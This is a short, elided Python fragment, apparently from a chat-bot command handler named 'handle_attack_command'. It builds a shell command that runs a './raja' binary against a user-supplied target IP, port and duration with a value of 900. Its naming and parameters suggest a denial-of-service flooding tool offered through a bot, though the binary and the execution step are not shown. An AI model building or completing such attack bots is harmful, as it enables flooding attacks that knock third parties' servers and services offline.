...
def handle_attack_command(message):
    ...
    try:
        ...
        # Execute the attack using the `./raja` command (make sure the raja binary is on your server and executable)
        attack_command = f"./raja {target_ip} {target_port} {duration} 900"
